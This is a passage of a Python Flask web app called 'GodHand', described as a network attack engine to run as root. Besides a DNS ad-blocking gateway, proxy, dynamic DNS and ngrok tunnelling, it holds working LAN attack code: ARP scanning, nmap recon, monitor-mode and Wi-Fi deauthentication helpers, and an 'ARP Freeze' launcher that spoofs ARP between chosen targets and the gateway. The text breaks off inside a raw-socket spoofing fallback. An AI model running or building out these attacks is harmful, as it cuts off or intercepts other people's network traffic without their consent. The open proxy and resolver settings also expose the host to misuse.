#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GodHand: Network Command – Single File WebApp
Dark "Obsidian & Aurora" theme, robust attack engine with verification,
server-side logging, authentication, and responsive UI.
Run as root.
"""

import os
import sys
import subprocess
import time
import json
import re
import threading
import socket
import struct
import fcntl
import random
import select
import ipaddress
import tempfile
import hashlib
import textwrap
import urllib.request
import urllib.parse
import base64
import secrets
from functools import wraps
from flask import Flask, request, jsonify, render_template_string, abort

# ---------- configuration ----------
SECRET = os.environ.get('GODHAND_SECRET', '')
APP_PORT = int(os.environ.get('GODHAND_PORT', 5000))
LOGIN_USERNAME = os.environ.get('GODHAND_USERNAME', 'admin')
LOGIN_PASSWORD = os.environ.get('GODHAND_PASSWORD', '')

# ---------- gateway (DNS/VPN/proxy) configuration ----------
GATEWAY_DIR = os.path.join(os.environ['PREFIX'], 'etc', 'godhand-gateway') if os.environ.get('PREFIX') else '/etc/godhand-gateway'
GW_UNBOUND_CONF = os.path.join(GATEWAY_DIR, 'unbound.conf')
GW_BLOCKLIST_CONF = os.path.join(GATEWAY_DIR, 'blocklist.conf')
GW_DNSCRYPT_CONF = os.path.join(GATEWAY_DIR, 'dnscrypt-proxy.toml')
GW_TINYPROXY_CONF = os.path.join(GATEWAY_DIR, 'tinyproxy.conf')
GW_DNS_PORT = 5335
GW_DNSCRYPT_PORT = 5353
GW_PROXY_PORT = 8888
DEFAULT_BLOCKED_DOMAINS = [
    'doubleclick.net', 'googlesyndication.com', 'googleadservices.com',
    'google-analytics.com', 'adservice.google.com', 'ads.yahoo.com',
    'adnxs.com', 'scorecardresearch.com', 'facebook.net', 'amazon-adsystem.com',
    'moatads.com', 'taboola.com', 'outbrain.com', 'criteo.com', 'pubmatic.com',
    'rubiconproject.com', 'openx.net', 'casalemedia.com', 'adsrvr.org',
    'bidswitch.net', 'quantserve.com', 'mmstat.com', 'analytics.twitter.com',
    'branch.io', 'app-measurement.com', 'flurry.com', 'chartbeat.com',
]

# ---------- global state with thread lock ----------
STATE = {
    'interface': None,
    'gateway': None,
    'port': 80,
    'targets': [],
    'hosts': [],
    'attack_pids': {},
    'attack_status': {},
    'blocked_macs': set(),
    'monitor_log': [],
    'monitor_entries': [],
    'monitor_log_path': None,
    'bandwidth_sample': None,
    'ddns': {
        'provider': None,          # 'duckdns' | 'noip'
        'domain': None,            # duckdns subdomain, or full no-ip hostname
        'token': None,             # duckdns token
        'username': None,          # no-ip username
        'password': None,          # no-ip password
        'enabled': False,
        'interval_minutes': 5,
        'last_ip': None,
        'last_update': None,
        'last_status': None,       # 'ok' | 'error' | None
        'last_message': None,
    },
    'ngrok_proc': None,
    'log': [],
    'status': 'Ready'
}
STATE_LOCK = threading.Lock()

def update_state(key, value):
    with STATE_LOCK:
        STATE[key] = value

def get_state(key):
    with STATE_LOCK:
        return STATE.get(key)

def add_to_list(key, value):
    with STATE_LOCK:
        STATE[key].append(value)

def remove_from_list(key, value):
    with STATE_LOCK:
        if value in STATE[key]:
            STATE[key].remove(value)

def add_to_set(key, value):
    with STATE_LOCK:
        STATE[key].add(value)

def discard_from_set(key, value):
    with STATE_LOCK:
        STATE[key].discard(value)

# ---------- server-side logging ----------
def add_log(level, msg):
    entry = {
        'time': time.strftime('%H:%M:%S'),
        'level': level,
        'msg': msg
    }
    with STATE_LOCK:
        STATE['log'].append(entry)
        STATE['log'] = STATE['log'][-200:]
    print(f"[{level.upper()}] {msg}")

# ---------- authentication ----------
VALID_SESSIONS = set()
SESSIONS_LOCK = threading.Lock()

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if SECRET or LOGIN_PASSWORD:
            token = request.headers.get('Authorization', '').replace('Bearer ', '')
            if not token:
                token = request.args.get('token', '')
            with SESSIONS_LOCK:
                session_ok = token in VALID_SESSIONS
            if not session_ok and not (SECRET and secrets.compare_digest(token, SECRET)):
                abort(401, description='Unauthorized')
        return f(*args, **kwargs)
    return decorated

app = Flask(__name__)

# ---------- login (opt-in: only enforced when GODHAND_PASSWORD is set) ----------
@app.route('/api/login_required', methods=['GET'])
def api_login_required():
    # True whenever require_auth would actually gate a request -- keeps this in
    # lockstep with require_auth's own condition so the login screen never skips
    # itself for a server that's still going to 401 every API call.
    return jsonify({'login_required': bool(LOGIN_PASSWORD or SECRET)})

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json or {}
    username = data.get('username', '')
    password = data.get('password', '')
    if LOGIN_PASSWORD and username == LOGIN_USERNAME and secrets.compare_digest(password, LOGIN_PASSWORD):
        token = secrets.token_hex(32)
        with SESSIONS_LOCK:
            VALID_SESSIONS.add(token)
        add_log('info', f'Login successful for user {username}')
        return jsonify({'success': True, 'token': token})
    # Legacy mode: GODHAND_SECRET alone (no username/password configured) --
    # the access token doubles as the password so there's still one login
    # screen instead of a dead end for anyone still using the old flow.
    if SECRET and secrets.compare_digest(password, SECRET):
        token = secrets.token_hex(32)
        with SESSIONS_LOCK:
            VALID_SESSIONS.add(token)
        add_log('info', 'Login successful via access token')
        return jsonify({'success': True, 'token': token})
    if not LOGIN_PASSWORD and not SECRET:
        return jsonify({'success': False, 'error': 'Login is not configured on this server'})
    add_log('warn', f'Failed login attempt for user {username!r}')
    return jsonify({'success': False, 'error': 'Invalid username or password'})

@app.route('/api/logout', methods=['POST'])
@require_auth
def api_logout():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    with SESSIONS_LOCK:
        VALID_SESSIONS.discard(token)
    return jsonify({'success': True})

# ---------- tool management ----------
_INSTALLED_TOOLS = set()
_INSTALL_ATTEMPTED = set()

def detect_package_manager():
    if os.path.exists('/data/data/com.termux'):
        return ('pkg', 'install', '-y')
    if subprocess.call(['which', 'apt-get'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('apt-get', 'install', '-y')
    if subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('pacman', '-S', '--noconfirm')
    if subprocess.call(['which', 'dnf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('dnf', 'install', '-y')
    if subprocess.call(['which', 'brew'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('brew', 'install')
    return None

def install_package(pkg_name):
    if pkg_name in _INSTALL_ATTEMPTED:
        return pkg_name in _INSTALLED_TOOLS
    _INSTALL_ATTEMPTED.add(pkg_name)
    pm = detect_package_manager()
    if pm is None:
        add_log('error', f'No package manager found; cannot install {pkg_name}')
        return False
    cmd = list(pm) + [pkg_name]
    try:
        add_log('info', f'Installing {pkg_name} ...')
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _INSTALLED_TOOLS.add(pkg_name)
        return True
    except:
        add_log('error', f'Failed to install {pkg_name}')
        return False

def tool_exists(name):
    """Check if tool exists and is executable."""
    try:
        out = subprocess.check_output(['which', name], stderr=subprocess.DEVNULL, text=True).strip()
        if not out:
            return False
        return os.access(out, os.X_OK)
    except:
        return False

def ensure_tool(tool_name, package_name=None):
    if tool_exists(tool_name):
        return True
    if package_name is None:
        package_name = tool_name
    pkg_map = {
        'arpspoof': 'dsniff',
        'aireplay-ng': 'aircrack-ng',
        'mdk4': 'mdk4',
        'hping3': 'hping3',
        'dhcpig': 'dhcpig',
        'iw': 'iw',
        'iptables': 'iptables',
        'nmap': 'nmap',
        'unbound': 'unbound',
        'dnscrypt-proxy': 'dnscrypt-proxy',
        'tinyproxy': 'tinyproxy',
        'ngrok': 'ngrok',
    }
    pkg = pkg_map.get(package_name, package_name)
    installed = install_package(pkg)
    if installed:
        # re-check executability after install
        return tool_exists(tool_name)
    return False

# ---------- network helpers ----------
def get_my_ip_and_cidr(iface):
    try:
        out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', iface], text=True)
        for line in out.splitlines():
            if 'inet ' in line:
                parts = line.split()
                ip_cidr = parts[3]
                return ip_cidr.split('/')
    except:
        pass
    return ('0.0.0.0', '24')

def get_mac(iface):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
        s.close()
        return info[18:24].hex(':')
    except:
        return '00:00:00:00:00:00'

def arp_scan(iface, my_ip, cidr):
    results = []
    net = ipaddress.IPv4Network(f'{my_ip}/{cidr}', strict=False)
    src_mac = bytes.fromhex(get_mac(iface).replace(':', ''))

    def arp_packet(src_mac, src_ip, dst_ip):
        eth = b'\xff' * 6 + src_mac + struct.pack('!H', 0x0806)
        arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1)
        arp += src_mac + socket.inet_aton(src_ip)
        arp += b'\x00' * 6 + socket.inet_aton(dst_ip)
        return eth + arp

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((iface, 0))
    sock.setblocking(0)

    hosts = [str(h) for h in net.hosts()]
    for ip in hosts:
        try:
            sock.send(arp_packet(src_mac, my_ip, ip))
        except:
            pass

    deadline = time.time() + 4
    seen = {}
    while time.time() < deadline:
        r, _, _ = select.select([sock], [], [], 0.1)
        if r:
            data, _ = sock.recvfrom(65535)
            if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
                if struct.unpack('!H', data[20:22])[0] == 2:
                    sip = socket.inet_ntoa(data[28:32])
                    smac = data[22:28]
                    if sip != my_ip and smac != b'\x00' * 6:
                        mac = smac.hex(':')
                        if sip not in seen:
                            seen[sip] = mac
                            results.append({'ip': sip, 'mac': mac})
    sock.close()
    return results

def get_gateway_mac(iface, gateway_ip):
    try:
        out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
        m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
        if m:
            return m.group(1)
    except:
        pass
    my_ip, cidr = get_my_ip_and_cidr(iface)
    hosts = arp_scan(iface, my_ip, cidr)
    for h in hosts:
        if h['ip'] == gateway_ip:
            return h['mac']
    return None

def server_ping(ip, timeout=1):
    try:
        subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
                                stderr=subprocess.DEVNULL, timeout=timeout+1)
        return True
    except:
        return False

def server_tcp_connect(ip, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

# ---------- nmap recon ----------
def parse_nmap_output(output):
    ports = []
    in_table = False
    for line in output.splitlines():
        if line.startswith('PORT'):
            in_table = True
            continue
        if not in_table:
            continue
        stripped = line.strip()
        if not stripped or stripped.startswith('Nmap done'):
            break
        m = re.match(r'^(\d+)/(tcp|udp)\s+(\S+)\s+(\S+)\s*(.*)$', stripped)
        if m:
            ports.append({
                'port': int(m.group(1)),
                'protocol': m.group(2),
                'state': m.group(3),
                'service': m.group(4),
                'version': m.group(5).strip(),
            })
    return ports

def run_nmap_scan(ip, full=False):
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        raise ValueError('Invalid IP')
    if not ensure_tool('nmap'):
        raise RuntimeError('nmap is not installed and could not be installed automatically')
    cmd = ['nmap', '-sS', '-sV', '-T4', '-Pn']
    cmd += ['-p-'] if full else ['-F', '--version-intensity', '2']
    cmd += [ip]
    timeout = 900 if full else 180
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        raise RuntimeError(f'Nmap scan timed out after {timeout}s')
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f'Nmap exited with an error: {e.output.strip()[-300:]}')
    return parse_nmap_output(out)

# ---------- bandwidth ----------
def get_iface_bytes(iface):
    try:
        with open('/proc/net/dev') as f:
            for line in f:
                if ':' not in line:
                    continue
                name, data = line.split(':', 1)
                if name.strip() != iface:
                    continue
                fields = data.split()
                return int(fields[0]), int(fields[8])
    except:
        pass
    return None

# ---------- gateway: shared helpers ----------
def proc_running(name):
    try:
        return subprocess.run(['pgrep', '-x', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    except:
        return False

def stop_proc(name):
    subprocess.run(['pkill', '-9', '-x', name], stderr=subprocess.DEVNULL)

def get_local_ip():
    iface = get_state('interface')
    if iface:
        ip, _ = get_my_ip_and_cidr(iface)
        if ip and ip != '0.0.0.0':
            return ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '0.0.0.0'

_EXTERNAL_IP_CACHE = {'ip': None, 'time': 0}
def get_external_ip():
    now = time.time()
    if _EXTERNAL_IP_CACHE['ip'] and now - _EXTERNAL_IP_CACHE['time'] < 300:
        return _EXTERNAL_IP_CACHE['ip']
    try:
        req = urllib.request.Request('https://api.ipify.org', headers={'User-Agent': 'GodHand'})
        with urllib.request.urlopen(req, timeout=5) as r:
            ip = r.read().decode().strip()
        _EXTERNAL_IP_CACHE['ip'] = ip
        _EXTERNAL_IP_CACHE['time'] = now
        return ip
    except:
        return _EXTERNAL_IP_CACHE['ip'] or 'Unknown'

def simple_dns_query(domain, server='127.0.0.1', port=53, timeout=3):
    txid = random.randint(0, 65535)
    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    qname = b''.join(struct.pack('B', len(p)) + p.encode() for p in domain.strip('.').split('.')) + b'\x00'
    question = qname + struct.pack('!HH', 1, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(header + question, (server, port))
        data, _ = s.recvfrom(512)
    finally:
        s.close()
    _, flags, _, ancount = struct.unpack('!HHHH', data[:8])
    return {'rcode': flags & 0x000F, 'answer_count': ancount}

# ---------- gateway: DNS privacy stack ----------
def fetch_blocklist_domains():
    try:
        req = urllib.request.Request(
            'https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts',
            headers={'User-Agent': 'GodHand'})
        with urllib.request.urlopen(req, timeout=20) as r:
            text = r.read().decode('utf-8', 'ignore')
        # Only "0.0.0.0 <domain>" lines are the actual blocklist body; a leading
        # "127.0.0.1 localhost"-style block is boilerplate, not domains to block.
        skip = {'0.0.0.0', 'localhost', 'localhost.localdomain', 'local', 'broadcasthost'}
        domain_re = re.compile(r'^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$')
        domains = []
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split()
            if len(parts) >= 2 and parts[0] == '0.0.0.0':
                d = parts[1].strip().lower()
                if d not in skip and domain_re.match(d):
                    domains.append(d)
        return domains or list(DEFAULT_BLOCKED_DOMAINS)
    except Exception as e:
        add_log('warn', f'Blocklist fetch failed, using built-in list: {e}')
        return list(DEFAULT_BLOCKED_DOMAINS)

def write_gateway_configs(domains):
    os.makedirs(GATEWAY_DIR, exist_ok=True)
    with open(GW_BLOCKLIST_CONF, 'w') as f:
        for d in domains:
            f.write(f'local-zone: "{d}." always_nxdomain\n')

    dnscrypt_toml = textwrap.dedent(f"""\
        listen_addresses = ['127.0.0.1:{GW_DNSCRYPT_PORT}']
        server_names = ['cloudflare', 'quad9-dnscrypt-ip4-filter-pri']
        ipv4_servers = true
        ipv6_servers = false
        dnscrypt_servers = true
        doh_servers = true
        require_dnssec = true
        require_nolog = true
        cache = true
        cache_size = 4096
        [sources.'public-resolvers']
        urls = ['https://raw.githubusercontent.com/DNSCrypt/dnscrypt-resolvers/master/v3/public-resolvers.md']
        cache_file = '{GATEWAY_DIR}/public-resolvers.md'
        minisign_key = 'RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3'
        refresh_delay = 72
        prefix = ''
    """)
    with open(GW_DNSCRYPT_CONF, 'w') as f:
        f.write(dnscrypt_toml)

    unbound_conf = textwrap.dedent(f"""\
        server:
            interface: 0.0.0.0@{GW_DNS_PORT}
            access-control: 0.0.0.0/0 allow
            do-ip4: yes
            do-ip6: no
            do-udp: yes
            do-tcp: yes
            harden-dnssec-stripped: yes
            qname-minimisation: yes
            hide-identity: yes
            hide-version: yes
            use-caps-for-id: yes
            cache-min-ttl: 300
            do-not-query-localhost: no
            username: ""
            chroot: ""
            pidfile: "{GATEWAY_DIR}/unbound.pid"
            logfile: "{GATEWAY_DIR}/unbound.log"
            include: "{GW_BLOCKLIST_CONF}"
        forward-zone:
            name: "."
            forward-addr: 127.0.0.1@{GW_DNSCRYPT_PORT}
    """)
    with open(GW_UNBOUND_CONF, 'w') as f:
        f.write(unbound_conf)

def gateway_blocklist_count():
    try:
        with open(GW_BLOCKLIST_CONF) as f:
            return sum(1 for _ in f)
    except:
        return 0

def gateway_dns_status():
    return {
        'unbound': proc_running('unbound'),
        'dnscrypt': proc_running('dnscrypt-proxy'),
        'blocklist_domains': gateway_blocklist_count(),
    }

def start_gateway_dns():
    if not ensure_tool('dnscrypt-proxy'):
        raise RuntimeError('dnscrypt-proxy could not be installed')
    if not ensure_tool('unbound'):
        raise RuntimeError('unbound could not be installed')
    if not os.path.exists(GW_BLOCKLIST_CONF):
        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS))
    stop_proc('dnscrypt-proxy')
    stop_proc('unbound')
    time.sleep(0.3)
    dnscrypt_proc = subprocess.Popen(['dnscrypt-proxy', '-config', GW_DNSCRYPT_CONF],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(1.5)
    if dnscrypt_proc.poll() is not None:
        err = dnscrypt_proc.stderr.read().decode(errors='ignore')[-400:]
        raise RuntimeError(f'dnscrypt-proxy failed to start: {err}')
    unbound_proc = subprocess.Popen(['unbound', '-c', GW_UNBOUND_CONF, '-d'],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(1)
    if unbound_proc.poll() is not None:
        err = unbound_proc.stderr.read().decode(errors='ignore')[-400:]
        stop_proc('dnscrypt-proxy')
        raise RuntimeError(f'unbound failed to start: {err}')
    add_log('success', 'Gateway DNS stack started (Unbound + DNSCrypt-proxy)')

def stop_gateway_dns():
    stop_proc('unbound')
    stop_proc('dnscrypt-proxy')
    add_log('info', 'Gateway DNS stack stopped')

def test_gateway_dns():
    results = {}
    for domain, expect_block in [('google.com', False), ('doubleclick.net', True)]:
        try:
            r = simple_dns_query(domain, '127.0.0.1', GW_DNS_PORT, timeout=3)
            blocked = r['rcode'] == 3 or r['answer_count'] == 0
            results[domain] = {'blocked': blocked, 'expected_block': expect_block, 'ok': blocked == expect_block}
        except Exception as e:
            results[domain] = {'blocked': None, 'expected_block': expect_block, 'ok': False, 'error': str(e)}
    return results

# ---------- gateway: VPN detection ----------
def gateway_vpn_status():
    wg_active = False
    try:
        out = subprocess.check_output(['ip', 'link', 'show', 'wg0'], stderr=subprocess.DEVNULL, text=True)
        wg_active = 'UP' in out.split('<', 1)[-1].split('>', 1)[0] if '<' in out else False
    except:
        pass
    openvpn_active = proc_running('openvpn')
    cloudflared_active = proc_running('cloudflared')
    return {
        'wireguard': wg_active,
        'openvpn': openvpn_active,
        'cloudflared': cloudflared_active,
        'active': wg_active or openvpn_active or cloudflared_active,
    }

# ---------- gateway: network-wide proxy ----------
def write_tinyproxy_conf():
    os.makedirs(GATEWAY_DIR, exist_ok=True)
    conf = textwrap.dedent(f"""\
        Port {GW_PROXY_PORT}
        Listen 0.0.0.0
        Timeout 600
        MaxClients 100
        Allow 0.0.0.0/0
        PidFile "{GATEWAY_DIR}/tinyproxy.pid"
        LogFile "{GATEWAY_DIR}/tinyproxy.log"
    """)
    with open(GW_TINYPROXY_CONF, 'w') as f:
        f.write(conf)

def gateway_proxy_status():
    return {'tinyproxy': proc_running('tinyproxy'), 'port': GW_PROXY_PORT}

def start_gateway_proxy():
    if not ensure_tool('tinyproxy'):
        raise RuntimeError('tinyproxy could not be installed')
    if not os.path.exists(GW_TINYPROXY_CONF):
        write_tinyproxy_conf()
    stop_proc('tinyproxy')
    time.sleep(0.3)
    proc = subprocess.Popen(['tinyproxy', '-c', GW_TINYPROXY_CONF, '-d'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(1)
    if proc.poll() is not None:
        err = proc.stderr.read().decode(errors='ignore')[-400:]
        raise RuntimeError(f'tinyproxy failed to start: {err}')
    add_log('success', f'Gateway proxy started on port {GW_PROXY_PORT}')

def stop_gateway_proxy():
    stop_proc('tinyproxy')
    add_log('info', 'Gateway proxy stopped')

# ---------- gateway: dynamic DNS (DuckDNS / No-IP) ----------
def ddns_update_duckdns(domain, token):
    """https://www.duckdns.org/spec.jsp -- plain-text 'OK'/'KO' response."""
    domain = domain.strip().removesuffix('.duckdns.org')
    url = ('https://www.duckdns.org/update?domains=' + urllib.parse.quote(domain) +
           '&token=' + urllib.parse.quote(token) + '&ip=')
    req = urllib.request.Request(url, headers={'User-Agent': 'GodHand'})
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode('utf-8', 'ignore').strip()
    return body.upper().startswith('OK'), body

def ddns_update_noip(hostname, username, password):
    """No-IP Dynamic Update API -- HTTP Basic Auth, plain-text 'good <ip>'/'nochg <ip>'/error code."""
    url = 'https://dynupdate.no-ip.com/nic/update?hostname=' + urllib.parse.quote(hostname)
    req = urllib.request.Request(url, headers={'User-Agent': 'GodHand-DDNS/1.0'})
    auth = base64.b64encode(f'{username}:{password}'.encode()).decode()
    req.add_header('Authorization', f'Basic {auth}')
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode('utf-8', 'ignore').strip()
    ok = body.split()[0] in ('good', 'nochg') if body else False
    return ok, body

def ddns_perform_update():
    cfg = get_state('ddns')
    provider = cfg.get('provider')
    if provider not in ('duckdns', 'noip'):
        return
    # last_update marks the last *attempt*, success or not -- the supervisor loop uses
    # it to pace retries to the configured interval, so a failing provider never gets
    # hammered every 30s (that's how DDNS accounts get rate-limited or flagged for abuse).
    try:
        if provider == 'duckdns':
            ok, msg = ddns_update_duckdns(cfg['domain'], cfg['token'])
        else:
            ok, msg = ddns_update_noip(cfg['domain'], cfg['username'], cfg['password'])
        with STATE_LOCK:
            if ok:
                STATE['ddns']['last_ip'] = get_external_ip()
            STATE['ddns']['last_update'] = time.strftime('%Y-%m-%d %H:%M:%S')
            STATE['ddns']['last_status'] = 'ok' if ok else 'error'
            STATE['ddns']['last_message'] = msg
        add_log('success' if ok else 'error', f'DDNS update ({provider}): {msg}')
    except Exception as e:
        with STATE_LOCK:
            STATE['ddns']['last_update'] = time.strftime('%Y-%m-%d %H:%M:%S')
            STATE['ddns']['last_status'] = 'error'
            STATE['ddns']['last_message'] = str(e)
        add_log('error', f'DDNS update failed: {e}')

def ddns_supervisor_loop():
    """Background daemon: wakes periodically, updates when enabled and due. Never runs unless enabled."""
    while True:
        time.sleep(30)
        try:
            cfg = get_state('ddns')
            if not cfg or not cfg.get('enabled') or cfg.get('provider') not in ('duckdns', 'noip'):
                continue
            interval_s = max(60, int(cfg.get('interval_minutes') or 5) * 60)
            last = cfg.get('last_update')
            due = True
            if last:
                try:
                    due = (time.time() - time.mktime(time.strptime(last, '%Y-%m-%d %H:%M:%S'))) >= interval_s
                except:
                    due = True
            if due:
                ddns_perform_update()
        except Exception as e:
            add_log('error', f'DDNS supervisor error: {e}')

# ---------- gateway: remote tunnel (ngrok) ----------
def start_ngrok_tunnel(port, authtoken=None):
    if not ensure_tool('ngrok'):
        raise RuntimeError(
            "ngrok isn't installed and isn't available through this system's package manager "
            "(it isn't a standard distro package). Install it manually from ngrok.com, run "
            "'ngrok config add-authtoken <token>' once, then try again."
        )
    if authtoken:
        subprocess.run(['ngrok', 'config', 'add-authtoken', authtoken],
                        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=10)
    stop_proc('ngrok')
    time.sleep(0.3)
    proc = subprocess.Popen(['ngrok', 'http', str(port), '--log=stdout'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(2)
    if proc.poll() is not None:
        err = proc.stderr.read().decode(errors='ignore')[-400:] if proc.stderr else ''
        raise RuntimeError(f'ngrok failed to start: {err}')
    return proc

def get_ngrok_public_url():
    """ngrok exposes its own local status API on 127.0.0.1:4040 while running."""
    try:
        req = urllib.request.Request('http://127.0.0.1:4040/api/tunnels', headers={'User-Agent': 'GodHand'})
        with urllib.request.urlopen(req, timeout=3) as r:
            data = json.loads(r.read().decode())
        tunnels = data.get('tunnels', [])
        for t in tunnels:
            if t.get('proto') == 'https':
                return t.get('public_url')
        return tunnels[0].get('public_url') if tunnels else None
    except:
        return None

# ---------- monitor mode ----------
def set_monitor(iface, enable=True, raise_on_fail=False):
    """Attempt to set monitor mode. Returns True on success, False otherwise."""
    mode = 'monitor' if enable else 'managed'
    try:
        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        if enable:
            time.sleep(0.5)
            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
            if 'type monitor' not in out:
                raise RuntimeError(f'Failed to set monitor mode on {iface}')
        return True
    except subprocess.CalledProcessError as e:
        if raise_on_fail:
            raise RuntimeError(f'Monitor mode change failed (exit {e.returncode}). Interface may not support monitor mode.')
        return False
    except Exception as e:
        if raise_on_fail:
            raise RuntimeError(str(e))
        return False

def check_monitor_support(iface):
    """Check if monitor mode is supported by the interface/driver."""
    try:
        # Use iw phy to list capabilities
        out = subprocess.check_output(['iw', 'phy'], text=True)
        if 'monitor' in out.lower():
            return True
        # Fallback: attempt to set and revert quickly
        return set_monitor(iface, True) and set_monitor(iface, False)
    except:
        return False

# ---------- native (no-monitor-mode) deauth via AP station-del ----------
# When this device's own Wi-Fi interface is running as an access point (e.g. a
# rooted-Android hotspot), the kernel can be told to deauth one of ITS OWN
# connected stations via `iw dev <if> station del <mac> subtype 0xC` -- a real
# nl80211 primitive, no monitor mode, no packet injection, interface stays
# fully operational. This does NOT let a client interface forge deauth frames
# at other devices on a network it merely joined; there is no netlink shortcut
# for that -- it genuinely requires monitor mode + an injection-capable driver,
# which is why that path (below) is left untouched.
def get_iface_type(iface):
    """Return the current nl80211 interface type (managed, AP, monitor, ...) or None if unknown."""
    try:
        out = subprocess.check_output(['iw', 'dev', iface, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
        m = re.search(r'^\s*type (\S+)', out, re.MULTILINE)
        return m.group(1) if m else None
    except:
        return None

def list_ap_stations(iface):
    """MAC addresses of stations currently associated to this AP-mode interface."""
    try:
        out = subprocess.check_output(['iw', 'dev', iface, 'station', 'dump'], stderr=subprocess.DEVNULL, text=True, timeout=5)
    except:
        return []
    return [m.lower() for m in re.findall(r'^Station ([0-9a-fA-F:]{17})', out, re.MULTILINE)]

def native_deauth_station(iface, mac, reason_code=2):
    """Send a real kernel-native deauth to an associated station. Only valid when iface is our own AP."""
    try:
        res = subprocess.run(['iw', 'dev', iface, 'station', 'del', mac, 'subtype', '0xC', 'reason-code', str(reason_code)],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return res.returncode == 0
    except:
        return False

def deauth_capability(iface):
    """What mechanism kick_client/start_attack_deauth will actually use for this interface, honestly."""
    iface_type = get_iface_type(iface)
    if iface_type == 'AP':
        return {'method': 'native', 'iface_type': iface_type, 'ap_station_count': len(list_ap_stations(iface))}
    if check_monitor_support(iface):
        return {'method': 'monitor', 'iface_type': iface_type}
    return {'method': 'unavailable', 'iface_type': iface_type}

# ---------- checksum helpers ----------
def ip_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def tcp_checksum(ip_src, ip_dst, tcp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
    checksum_data = psh + tcp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def udp_checksum(ip_src, ip_dst, udp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
    checksum_data = psh + udp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ---------- attack launchers ----------
def start_attack_arp_freeze(targets, gateway, iface):
    add_log('info', f'Starting ARP Freeze on {iface} for {len(targets)} targets')
    pids = []
    if ensure_tool('arpspoof', 'dsniff'):
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError(f'arpspoof failed for target {t}')
            pids.append(proc)
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError(f'arpspoof failed for gateway {gateway}')
            pids.append(proc)
        return pids
    else:
        # Fallback: raw socket ARP spoof
        fake_mac = '02:00:00:00:00:01'
